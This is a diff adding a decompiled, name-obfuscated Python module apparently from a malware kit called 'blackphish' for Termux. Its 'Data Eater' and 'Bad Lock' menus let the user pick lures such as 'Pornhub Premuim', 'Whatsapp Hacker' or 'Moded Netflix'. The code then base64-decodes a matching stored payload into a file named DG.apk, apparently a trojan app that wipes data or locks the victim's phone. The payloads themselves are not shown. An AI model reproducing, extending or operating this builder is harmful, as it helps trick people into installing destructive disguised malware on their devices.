@@ -1,0 +1,106 @@
+# uncompyle6 version 3.8.0
+# Python bytecode 3.8.0 (3413)
+# Decompiled from: Python 2.7.18 (default, Oct 10 2021, 22:29:32) 
+# [GCC 11.1.0]
+# Warning: this version of Python has problems handling the Python 3 byte type in constants properly.
+
+# Embedded file name: /data/data/com.termux/files/home/blackphish/files/deater.py
+# Compiled at: 2020-04-12 02:26:00
+# Size of source mod 2**32: 3597 bytes
+from files.startup import *
+
+def deater():
+    O000OO00OOOOOO00O = red + '[' + green + '0' + red + ']'
+    OOOO00O00000O0O0O = ['WpsApp Pro', 'Pornhub Premuim', 'Whatsapp Hacker', 'Termux', 'Moded Netflix', 'NetHunter', 'Wifi Kill', 'Aircrack-ng', 'CardingApp', 'Exit']
+    O0OOOO000OO0O00OO = 0
+    while O0OOOO000OO0O00OO < len(OOOO00O00000O0O0O):
+        slow('\n\r' + O000OO00OOOOOO00O.replace('0', str(O0OOOO000OO0O00OO + 1)) + yellow + ' ' + OOOO00O00000O0O0O[O0OOOO000OO0O00OO], 0.005)
+        O0OOOO000OO0O00OO = O0OOOO000OO0O00OO + 1
+
+    OO0OOOO00OO0OO00O = '/sdcard'
+    print('\n')
+    O0O0OO0OO0O00OOO0 = input(green + 'Data Eater ' + red + '>' + yellow)
+    O00O0000OO00O0O00 = 'null'
+    if O0O0OO0OO0O00OOO0 == '1':
+        O00O0000OO00O0O00 = 'wps'
+    else:
+        if O0O0OO0OO0O00OOO0 == '2':
+            O00O0000OO00O0O00 = 'ph'
+        else:
+            if O0O0OO0OO0O00OOO0 == '3':
+                O00O0000OO00O0O00 = 'wa'
+            else:
+                if O0O0OO0OO0O00OOO0 == '4':
+                    O00O0000OO00O0O00 = 'tmx'
+                else:
+                    if O0O0OO0OO0O00OOO0 == '5':
+                        O00O0000OO00O0O00 = 'nf'
+                    else:
+                        if O0O0OO0OO0O00OOO0 == '6':
+                            O00O0000OO00O0O00 = 'nh'
+                        else:
+                            if O0O0OO0OO0O00OOO0 == '7':
+                                soon()
+                            else:
+                                if O0O0OO0OO0O00OOO0 == '8':
+                                    soon()
+                                else:
+                                    if O0O0OO0OO0O00OOO0 == '9':
+                                        soon()
+                                    else:
+                                        if O0O0OO0OO0O00OOO0 == '10':
+                                            exit(0)
+                                        OO0OOOO00OO0OO00O = input(green + 'path :' + red)
+                                        bbase64('de', O00O0000OO00O0O00, OO0OOOO00OO0OO00O + 'DG.apk')
+                                        slow(green + 'Generated as ' + red + OO0OOOO00OO0OO00O + 'DG.apk', 0.1)
+
+
+def bbase64(OOOO0OOO0OO0000OO, O00O00OOO000O0OO0, OOO0O000O00O0000O):
+    os.system('base64 -d ' + str(OOOO0OOO0OO0000OO) + '/' + str(O00O00OOO000O0OO0) + '>' + str(OOO0O000O00O0000O))
+
+
+def block():
+    O000OO00OOOOOO00O = red + '[' + green + '0' + red + ']'
+    OOOO00O00000O0O0O = ['WpsApp Pro', 'Pornhub Premuim', 'Whatsapp Hacker', 'Termux', 'Moded Netflix', 'NetHunter', 'Wifi Kill', 'Aircrack-ng', 'CardingApp', 'Exit']
+    O0OOOO000OO0O00OO = 0
+    while O0OOOO000OO0O00OO < len(OOOO00O00000O0O0O):
+        slow('\n\r' + O000OO00OOOOOO00O.replace('0', str(O0OOOO000OO0O00OO + 1)) + yellow + ' ' + OOOO00O00000O0O0O[O0OOOO000OO0O00OO], 0.005)
+        O0OOOO000OO0O00OO = O0OOOO000OO0O00OO + 1
+
+    OO0OOOO00OO0OO00O = '/sdcard'
+    print('\n')
+    O0O0OO0OO0O00OOO0 = input(green + 'Bad Lock ' + red + '>' + yellow)
+    O00O0000OO00O0O00 = 'null'
+    if O0O0OO0OO0O00OOO0 == '1':
+        O00O0000OO00O0O00 = 'wps'
+    else:
+        if O0O0OO0OO0O00OOO0 == '2':
+            O00O0000OO00O0O00 = 'ph'
+        else:
+            if O0O0OO0OO0O00OOO0 == '3':
+                O00O0000OO00O0O00 = 'wa'
+            else:
+                if O0O0OO0OO0O00OOO0 == '4':
+                    O00O0000OO00O0O00 = 'tmx'
+                else:
+                    if O0O0OO0OO0O00OOO0 == '5':
+                        O00O0000OO00O0O00 = 'nf'
+                    else:
+                        if O0O0OO0OO0O00OOO0 == '6':
+                            O00O0000OO00O0O00 = 'nh'
+                        else:
+                            if O0O0OO0OO0O00OOO0 == '7':
+                                soon()
+                            else:
+                                if O0O0OO0OO0O00OOO0 == '8':
+                                    soon()
+                                else:
+                                    if O0O0OO0OO0O00OOO0 == '9':
+                                        soon()
+                                    else:
+                                        if O0O0OO0OO0O00OOO0 == '10':
+                                            exit(0)
+                                        OO0OOOO00OO0OO00O = input(green + 'path :' + red)
+                                        bbase64('bl', O00O0000OO00O0O00, OO0OOOO00OO0OO00O + 'DG.apk')
+                                        slow(green + 'Generated as ' + red + OO0OOOO00OO0OO00O + 'DG.apk', 0.1)
+# okay decompiling deater.pyc
